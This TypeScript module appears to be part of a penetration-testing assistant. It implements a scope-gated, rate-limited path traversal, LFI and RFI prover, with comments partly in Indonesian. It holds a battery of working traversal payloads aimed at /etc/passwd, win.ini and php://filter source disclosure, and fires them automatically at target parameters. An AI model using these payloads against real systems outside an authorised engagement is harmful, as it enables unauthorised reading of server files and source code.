// pathTraversal.ts — path traversal / LFI / RFI read-marker prover (write/confirm
// tool `path_traversal`). Two-stage, keyless, scope-gated, bounded:
//
//   Stage 1 (direct): one canonical "..%2f..%2f..%2fetc%2fpasswd"-style payload
//   per candidate param against a clean baseline.
//   Stage 2 (escalation): only params that RESPOND (marker hit or clear anomaly
//   vs baseline) get the full encoder battery — encoded slashes, dot-folding
//   (....//), windows separators, absolute paths, php://filter base64.
//
// Markers are READ markers with a baseline-absent requirement (a page that
// already prints /etc/passwd content is not traversal proof):
//   • /etc/passwd → root:x:0:0: pattern (PASSWD_RE) — baseline must NOT contain it
//   • win.ini     → [fonts] / [extensions] / [mci extensions] / [mail]
//   • php://filter→ base64 body decoded latin1 contains <?php / <?= / <?xml
//     (Buffer#toString("latin1") = true 1:1 byte map — TextDecoder("latin1")
//     decodes as windows-1252 and must not be used).
//
// RFI via `callback` (https-only, owner-controlled OAST host) is an HONEST
// "server mencoba menjadi HTTP client" signal: a remote include/fetch is only
// CONFIRMED by the callback log (oast_poll / webhook.site), never by the
// response body echoing the URL. Bounded: ≤MAX_PARAMS params × ≤MAX_ESCALATION
// payloads (+ 1 RFI probe per param when callback given), politeDelay spacing,
// every request recorded via recordHttp, session cookies/headers merged when a
// session name is given. Sinyal ≠ vuln: poc_verify sebelum finding_add.
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";
const MAX_PARAMS = 4;
const MAX_ESCALATION = 8;
const BODY_BUDGET = 12_000;

// Matches BOTH passwd dialects: Linux `root:x:0:0:root:/root:/bin/bash` AND
// macOS/BSD `root:*:0:0:System Administrator:/var/root:/bin/sh` (GECOS may
// contain spaces — `\S*` missed the whole BSD family, caught by the live
// toy-server verify on darwin). Each field is colon-delimited, no newlines.
const PASSWD_RE = /root:[^:\n]*:[0-9]+:[0-9]+:[^:\n]*:/i;
const WININI_RE = /\[fonts\]|\[extensions\]|\[mci extensions\]|\[mail\]/i;
const PHP_TAG_RE = /<\?php|<\?=|<\?xml/i;

/** Param names most likely to feed a file/include/url load. */
export const TRAVERSAL_PARAMS = [
  "file", "filename", "path", "dir", "page", "view", "template",
  "include", "load", "read", "download", "export", "report", "doc",
  "document", "lang", "theme", "log", "url", "src",
];

/** Encoder battery run on responsive params only (stage 2). */
export const ESCALATION_PAYLOADS: Array<{ p: string; note: string }> = [
  { p: "../../../../etc/passwd", note: "traversal langsung" },
  { p: "..%2f..%2f..%2f..%2fetc%2fpasswd", note: "slash ter-encode (%2f)" },
  { p: "....//....//....//....//etc/passwd", note: "dot folding (....//)" },
  { p: "/etc/passwd", note: "absolute path" },
  { p: "..\\..\\..\\..\\windows\\win.ini", note: "windows backslash" },
  { p: "..%5c..%5c..%5c..%5cwindows%5cwin.ini", note: "windows encoded (%5c)" },
  { p: "C:\\Windows\\win.ini", note: "windows absolute" },
  { p: "php://filter/convert.base64-encode/resource=index.php", note: "php://filter base64 index.php" },
];

/** URL-capable param names — only these get an RFI (callback) probe. */
const RFI_PARAMS = new Set([
  "url", "uri", "src", "source", "link", "href", "redirect", "next",
  "return", "returnto", "dest", "destination", "target", "ref", "referer",
  "include", "load", "path", "file", "download", "callback",
]);

export type Probe = { status: number; body: string; ms: number; error?: string };

/** Build the request for one param+payload. Pure — used by tests. */
export function applyPayload(u: URL, param: string, payload: string, method: "GET" | "POST"): { url: string; body?: string } {
  const c = new URL(u.toString());
  if (method === "POST") {
    const sp = new URLSearchParams(c.search);
    sp.set(param, payload);
    c.search = "";
    return { url: c.toString(), body: sp.toString() };
  }
  c.searchParams.set(param, payload);
  return { url: c.toString() };
}

/**
 * Decode a php://filter base64-encoded body into its raw bytes (latin1, 1:1
 * byte map). Only a body that is ENTIRELY base64 charset (after whitespace
 * strip) qualifies — HTML pages never match, so normal responses return "".
 */
export function phpFilterDecode(body: string): string {
  const stripped = (body || "").replace(/\s+/g, "");
  if (!/^[A-Za-z0-9+/=]{20,}$/.test(stripped)) return "";
  try {
    return Buffer.from(stripped, "base64").toString("latin1").slice(0, 8000);
  } catch {
    return "";
  }
}

/**
 * Read-marker classification. Pure. Returns one of the marker labels or null.
 * PASSWD/WININI require the marker to be ABSENT from the baseline body — a page
 * that displays /etc/passwd content as a feature is not traversal proof.
 */
export function traversalMarker(body: string, baselineBody: string): "passwd" | "winini" | "php" | null {
  const b = body || "";
  const base = baselineBody || "";
  if (PASSWD_RE.test(b) && !PASSWD_RE.test(base)) return "passwd";
  if (WININI_RE.test(b) && !WININI_RE.test(base)) return "winini";
  if (PHP_TAG_RE.test(phpFilterDecode(b))) return "php";
  return null;
}

/** Clear anomaly vs baseline (status change or size shift) → escalation. Pure. */
export function isAnomaly(base: Probe, p: Probe): boolean {
  if (p.error || p.status === 0) return false;
  if (p.status !== base.status) return true;
  return Math.abs((p.body || "").length - (base.body || "").length) > 60;
}

async function probe(url: string, method: "GET" | "POST", body: string | undefined, session: string | undefined, rawUser: unknown): Promise<Probe> {
  const headers: Record<string, string> = { "User-Agent": UA };
  if (session && rawUser) {
    const s = sessionHeaders(rawUser, session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  if (body !== undefined) headers["content-type"] = "application/x-www-form-urlencoded";
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body: body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    return { status: res.status, body: (await res.text()).slice(0, BODY_BUDGET), ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

function noteFor(marker: string, payloadNote: string): string {
  switch (marker) {
    case "passwd": return `README /etc/passwd (root:…:0:0:…) via ${payloadNote} — LFI/path traversal read`;
    case "winini": return `win.ini terlihat ([fonts]/[extensions]) via ${payloadNote} — traversal Windows`;
    case "php": return `php://filter base64 → source ter-decode (<?php) — source disclosure LFI`;
    default: return payloadNote;
  }
}

/**
 * Path-traversal read-marker prover. Two-stage, bounded, honest.
 * A hit is a LEAD: poc_verify (deterministic replay) before finding_add.
 */
export async function pathTraversal(
  rawUser: unknown,
  opts: { url?: string; params?: string; session?: string; callback?: string; method?: string } = {}
): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw)) return "Error: SCOPE — path_traversal hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  let u: URL;
  try {
    u = new URL(raw);
  } catch {
    return "Error: URL tidak valid.";
  }
  const callback = String(opts.callback || "").trim();
  if (callback && !/^https:\/\//i.test(callback)) return "Error: callback harus https:// (OAST/beacon aman).";
  const method: "GET" | "POST" = (opts.method || "GET").toUpperCase() === "POST" ? "POST" : "GET";

  const explicit = String(opts.params || "").split(",").map((s) => s.trim()).filter(Boolean);
  const query = [...new Set(u.searchParams.keys())];
  const names = [...new Set(explicit.length ? explicit : query.length ? query : TRAVERSAL_PARAMS)].slice(0, MAX_PARAMS);
  if (!names.length) return "Error: tidak ada param untuk diuji (berikan `params` atau biarkan otomatis).";

  // Baseline: the URL as-is (no payload).
  await politeDelay();
  const baseline = await probe(u.toString(), method, method === "POST" ? u.searchParams.toString() : undefined, opts.session, rawUser);
  recordHttp(rawUser, { method, url: u.toString(), status: baseline.status, bytes: baseline.body.length, ms: baseline.ms, at: new Date().toISOString() });
  if (baseline.error) return `Error: baseline gagal jaringan (${baseline.error}) — coba lagi / target down.`;

  const hits: Array<{ param: string; payload: string; status: number; bytes: number; marker: "passwd" | "winini" | "php" | "rfi" | "anomaly"; note: string; preview?: string }> = [];
  let networkFail = 0;

  for (let i = 0; i < names.length; i++) {
    const param = names[i];
    // Stage 1: one direct traversal payload.
    const direct = ESCALATION_PAYLOADS[0];
    const r1 = applyPayload(u, param, direct.p, method);
    await politeDelay();
    const p1 = await probe(r1.url, method, r1.body, opts.session, rawUser);
    recordHttp(rawUser, { method, url: r1.url, status: p1.status, bytes: p1.body.length, ms: p1.ms, at: new Date().toISOString() });
    const m1 = traversalMarker(p1.body, baseline.body);
    if (m1) {
      hits.push({ param, payload: direct.p, status: p1.status, bytes: p1.body.length, marker: m1, note: noteFor(m1, direct.note), preview: p1.body.slice(0, 160) });
      continue; // already proven — no need to escalate this param
    }

    // RFI probe (honest — confirmation only via callback log).
    if (callback && RFI_PARAMS.has(param)) {
      const rfiVal = `${callback}/pt-${i}-${param}`;
      const rr = applyPayload(u, param, rfiVal, method);
      await politeDelay();
      const pr = await probe(rr.url, method, rr.body, opts.session, rawUser);
      recordHttp(rawUser, { method, url: rr.url, status: pr.status, bytes: pr.body.length, ms: pr.ms, at: new Date().toISOString() });
      // Reflection is NOT proof of include — just note the probe was sent.
      if (pr.body.includes(`pt-${i}-${param}`)) {
        hits.push({ param, payload: rfiVal, status: pr.status, bytes: pr.body.length, marker: "rfi", note: "URL remote dipantulkan di respons (reflection — BUKAN bukti include)" });
      }
    }

    // Stage 2: escalate the FULL battery only on responsive params.
    if (!isAnomaly(baseline, p1)) continue;
    for (const pl of ESCALATION_PAYLOADS.slice(1, MAX_ESCALATION)) {
      const r = applyPayload(u, param, pl.p, method);
      await politeDelay();
      const p = await probe(r.url, method, r.body, opts.session, rawUser);
      recordHttp(rawUser, { method, url: r.url, status: p.status, bytes: p.body.length, ms: p.ms, at: new Date().toISOString() });
      if (p.error || p.status === 0) { networkFail++; continue; }
      const m = traversalMarker(p.body, baseline.body);
      if (m) {
        hits.push({ param, payload: pl.p, status: p.status, bytes: p.body.length, marker: m, note: noteFor(m, pl.note), preview: p.body.slice(0, 160) });
      }
    }
    if (!hits.some((h) => h.param === param)) {
      hits.push({ param, payload: direct.p, status: p1.status, bytes: p1.body.length, marker: "anomaly", note: `param responsif (status/ukuran berubah) tapi TANPA marker read — bukan temuan, kandidat enum manual` });
    }
  }

  const head = `📂 PATH TRAVERSAL ${u.origin}${u.pathname} — ${names.length} param, ${hits.length} sinyal${networkFail ? `, ${networkFail} gagal jaringan` : ""}.`;
  if (!hits.length) {
    return `${head}\nTidak ada marker read (passwd/win.ini/php-filter) yang ditemukan — traversal tampak ditegakkan. (Tidak ada temuan ≠ klaim aman.)`;
  }
  const leads = hits.filter((h) => h.marker === "passwd" || h.marker === "winini" || h.marker === "php");
  const lines = hits.map((h) => {
    const tag = h.marker === "anomaly" || h.marker === "rfi" ? h.marker : "LEAD";
    return `• [${tag} ${h.status}/${h.bytes}b] param=“${h.param}” payload=“${h.payload.slice(0, 60)}”\n   ↳ ${h.note}${h.preview ? `\n   ↳ cuplikan: ${JSON.stringify(h.preview).replace(/\n/g, " / ").slice(0, 200)}` : ""}`;
  });
  return [
    head, ...lines, "",
    leads.length
      ? `⚠️ ${leads.length} LEAD — replay deterministik via \`poc_verify\` (payload + baseline + expect marker) sebelum \`finding_add\` (CWE-22 / CWE-98 / CWE-73).`
      : callback || hits.some((h) => h.marker === "rfi")
        ? "ℹ️ RFI tidak pernah diklaim dari respons — konfirmasi fetch server hanya via callback log (oast_poll / webhook.site)."
        : "Semua sinyal level info/anomaly — coba `params` eksplisit atau endpoint lain.",
  ].join("\n");
}